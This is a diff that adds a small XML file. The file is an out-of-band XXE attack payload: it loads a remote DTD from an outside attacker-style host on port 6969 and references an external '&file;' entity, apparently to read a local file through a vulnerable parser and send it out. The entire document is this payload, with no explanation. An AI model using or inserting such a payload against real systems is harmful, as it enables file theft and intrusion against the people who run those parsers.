@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [  
+   <!ELEMENT foo ANY>
+   <!ENTITY % rem1 SYSTEM "http://papahacked.me:6969/xxe/xxe_rem1">
+   %rem1;
+]>
+<lol>
+   &file;
+</lol>
